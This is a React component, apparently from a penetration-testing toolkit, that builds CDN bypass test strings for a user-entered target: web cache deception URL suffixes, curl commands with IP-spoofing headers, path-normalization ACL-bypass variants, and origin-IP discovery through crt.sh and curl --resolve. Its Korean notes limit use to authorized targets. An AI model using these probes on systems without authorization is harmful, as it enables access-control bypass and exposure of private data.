import { useState } from 'react'
import { DISCLAIMER, Note, TextInput, Readout } from './shared'
import { CDN_CACHE_VARIANTS, CDN_IDENTITY_HEADERS, CDN_NORMALIZATION_VARIANTS, shellQuote } from './reconCatalog'

export function CdnProxyBypassBuilder() {
  const [url, setUrl] = useState('')
  const trimmed = url.trim()
  const target = trimmed || 'https://TARGET'
  const domain = (trimmed || 'TARGET.COM').replace(/^https?:\/\//, '').replace(/\/.*$/, '')

  const targetUrl = trimmed || 'https://TARGET.example.com/private/resource'
  const origin = (() => { try { return new URL(targetUrl).origin } catch { return 'https://TARGET.example.com' } })()

  return (
    <div className="payload-builder">
      <Note>{DISCLAIMER}</Note>
      <TextInput label="대상 URL" value={url} onChange={setUrl} placeholder="https://example.com" />

      <div className="payload-readout-group">
        <strong className="payload-group-title">Web Cache Deception (WCD) 변형</strong>
        {CDN_CACHE_VARIANTS.map((v) => (
          <Readout key={v.suffix} title={v.label} value={`${target}${v.suffix}`} wrap="anywhere" />
        ))}
        <Note>정적 확장자·쿼리별 캐시 동작을 비교하는 후보 목록입니다. 캐시 상태 헤더와 실제 응답 차이를 함께 확인하고, 민감한 응답은 저장하거나 공유하지 마세요.</Note>
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">IP 스푸핑 헤더 조합 (curl)</strong>
        {CDN_IDENTITY_HEADERS.map(([header, value]) => (
          <Readout key={header} title={header} value={`curl -sS -I --max-time 8 -H ${shellQuote(`${header}: ${value.replace('TARGET.example.com', domain)}`)} ${shellQuote(targetUrl)}`} wrap="anywhere" />
        ))}
        <Note>헤더를 넣었다는 사실만으로 원본 접근 우회가 입증되지는 않습니다. 허가된 대상의 응답 상태·캐시 헤더를 기준 요청과 비교하세요.</Note>
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">경로 정규화 불일치 (ACL 우회)</strong>
        {CDN_NORMALIZATION_VARIANTS.map((path) => (
          <Readout key={path} title={path} value={`${origin}${path}`} wrap="anywhere" />
        ))}
        <Note>모두 동일한 애플리케이션 내 `/private/resource` 경로 표현 차이입니다. 실제 보호 경로로 바꾸고, 상태·리다이렉트·캐시 결과만 확인하세요.</Note>
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">CDN 뒤 원본 IP 탐색</strong>
        <Readout title="crt.sh 인증서 검색" value={`https://crt.sh/?q=%25.${domain}`} wrap="anywhere" />
        <Note>crt.sh의 인증서 이름에서 서브도메인과 원본 노출 후보를 확인하고, SecurityTrails·Censys 등의 과거 DNS 레코드로 CDN 적용 전 IP 후보를 교차 확인합니다.</Note>
        <Readout title="HTTP 원본 IP 후보 확인 (헤더만)" value={`curl -sS -I --max-time 8 -H ${shellQuote(`Host: ${domain}`)} ${shellQuote('http://[승인된 원본 IP 후보]/')}`} wrap="anywhere" />
        <Readout title="HTTPS 원본 IP 후보 확인 (SNI 유지, 인증서 검증)" value={`curl -sS -I --max-time 8 --resolve ${shellQuote(`${domain}:443:[승인된 원본 IP 후보]`)} ${shellQuote(`https://${domain}/`)}`} wrap="anywhere" />
        <Note>후보 IP는 승인된 자산 인벤토리에서만 사용하세요. 인증서 검증을 끄는 `-k`는 사용하지 않습니다. 응답 차이만으로 원본 노출을 단정하지 말고 출처를 교차 확인하세요.</Note>
      </div>
    </div>
  )
}

export default CdnProxyBypassBuilder
